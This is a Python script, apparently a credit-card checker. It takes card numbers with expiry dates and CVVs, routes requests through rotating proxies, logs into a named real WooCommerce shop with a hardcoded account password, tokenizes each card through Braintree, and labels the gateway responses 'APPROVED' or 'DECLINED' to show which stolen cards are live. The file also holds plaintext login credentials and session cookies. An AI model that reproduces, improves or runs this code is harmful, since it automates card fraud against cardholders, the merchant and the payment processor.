import requests
import AdyenEncrypt
import json
import base64
from parse import parseX
import uuid
import random

proxiess = "proxys.txt"

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def braintree(tarjeta):
    try:
        session = requests.Session()
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
        
        SessionId = generar_codigo_session()

        splitter = tarjeta.split('|')
        ccnum = splitter[0]
        mes = splitter[1]
        cvv = splitter[3]
        ano = splitter[2]
        if len(ano) == 2:
            ano = "20" + ano
            

        req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
        brand = req['brand'].lower()
            


        headers = {
            'authority': 'www.theearthbodyinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.get('https://www.theearthbodyinstitute.com/my-account/', headers=headers).text
        login = parseX(response, 'name="woocommerce-login-nonce" value="', '"')
        
        data = {
            'username': '28yellow@puabook.com',
            'password': 'Kurama#1212',
            'woocommerce-login-nonce': 'e401564bdf',
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        response = session.post('https://www.theearthbodyinstitute.com/my-account/',  headers=headers, data=data)
        
        
        headers = {
            'authority': 'www.theearthbodyinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-21%2004%3A20%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.theearthbodyinstitute.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-21%2004%3A20%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.theearthbodyinstitute.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; dsm-load-popup-cookie-11841=dsm-onload; mailchimp.cart.current_email=28yellow@puabook.com; mailchimp_user_email=28yellow%40puabook.com; et-editor-available-post-11050-fb=fb; tk_ai=jetpack%3Awxtn85G%2FsHoEEgYAOC7GOl8x; mailchimp.cart.previous_email=28yellow@puabook.com; mailchimp_landing_site=https%3A%2F%2Fwww.theearthbodyinstitute.com%2Fmy-account%2F; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_a5f8abe0cd79ffa53616e65cc75b84c1=juan.smith%7C1708662750%7CuVFPck379IVR9Xbr8A8Kx6XWm4RLDGPeBGtcfAYhqAp%7C212a4a8af3333fbee884a86529a2c8c61cc0dcb942f38f16441e0f9366738f55; wfwaf-authcookie-9c7177b89ba3595ed948f02fd3e27215=2110%7Cother%7Cread%7C5f63a999e48e8afff63e2a289c1f9f2537663b3afb11c50002f3178f88e66c76; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.theearthbodyinstitute.com%2Fmy-account%2Fpayment-methods%2F',
            'referer': 'https://www.theearthbodyinstitute.com/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.get(
            'https://www.theearthbodyinstitute.com/my-account/add-payment-method/',
            headers=headers,
        ).text
            
        nonce = parseX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        nonce2 = parseX(response, '"client_token_nonce":"', '"')

        
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': nonce2,
        }

        response = session.post(
            'https://www.theearthbodyinstitute.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
        ).text
        
        bearer = parseX(response, '"data":"', '"')
        
        bearer = json.loads(base64.b64decode(bearer))
        bearer = bearer['authorizationFingerprint']
        
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': SessionId,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': ccnum,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
        
        tokencc = response['data']['tokenizeCreditCard']['token']
        
        print(tokencc)
        
        headers = {
            'authority': 'www.theearthbodyinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-21%2004%3A20%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.theearthbodyinstitute.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-21%2004%3A20%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.theearthbodyinstitute.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; dsm-load-popup-cookie-11841=dsm-onload; mailchimp.cart.current_email=28yellow@puabook.com; mailchimp_user_email=28yellow%40puabook.com; et-editor-available-post-11050-fb=fb; tk_ai=jetpack%3Awxtn85G%2FsHoEEgYAOC7GOl8x; mailchimp.cart.previous_email=28yellow@puabook.com; mailchimp_landing_site=https%3A%2F%2Fwww.theearthbodyinstitute.com%2Fmy-account%2F; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_a5f8abe0cd79ffa53616e65cc75b84c1=juan.smith%7C1708662750%7CuVFPck379IVR9Xbr8A8Kx6XWm4RLDGPeBGtcfAYhqAp%7C212a4a8af3333fbee884a86529a2c8c61cc0dcb942f38f16441e0f9366738f55; wfwaf-authcookie-9c7177b89ba3595ed948f02fd3e27215=2110%7Cother%7Cread%7C5f63a999e48e8afff63e2a289c1f9f2537663b3afb11c50002f3178f88e66c76; sbjs_session=pgs%3D21%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.theearthbodyinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
            'origin': 'https://www.theearthbodyinstitute.com',
            'referer': 'https://www.theearthbodyinstitute.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'visa'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', tokencc),
            ('wc_braintree_device_data', '{"correlation_id":"bb0d3bc81e318165ec99bb6706e2ce1e"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"bb0d3bc81e318165ec99bb6706e2ce1e"}'),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'USD'),
            ('wc_braintree_paypal_locale', 'en_us'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        response = session.post(
            'https://www.theearthbodyinstitute.com/my-account/add-payment-method/',
            headers=headers,
            data=data,
        ).text
        
        code = parseX(response, 'class="wc-block-components-notice-banner__content">', '</div>')
        code = code.strip().replace("<li>", "")
        print(code)
        
        if (int(response.find('Payment method successfully added')) > 0) or  (int(response.find('1000 Approved')) > 0):
            print("Approved", "(1000) Approved")
            msg = "APPROVED ✅"
            respuesta = "(1000) Approved"
                            

        elif int(code.find('Card Issuer Declined CVV')) > 0 :
            msg = "APPROVED CCN✅"
            respuesta = "Card Issuer Declined CVV (C2 : CVV2 DECLINED)"
            
        elif int(code.find('Insufficient Funds')) > 0 :
            msg = "APPROVED CVV✅"
            respuesta = "Insufficient Funds"
        
        elif int(code.find('avs_and_cvv')) > 0 :
            msg = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs_and_cvv"
            
        elif int(code.find('avs')) > 0 :
            msg = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs"
            
        
            
        else:
            respuesta = code
            msg = "DECLINED ❌"
        
                    
        session.close()   
        print(msg, "B3 OWNER")       
        return msg, respuesta
                
    
    except Exception as e:
        print("Se produjo una excepción:", e)
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
        
        return msg, respuesta
   

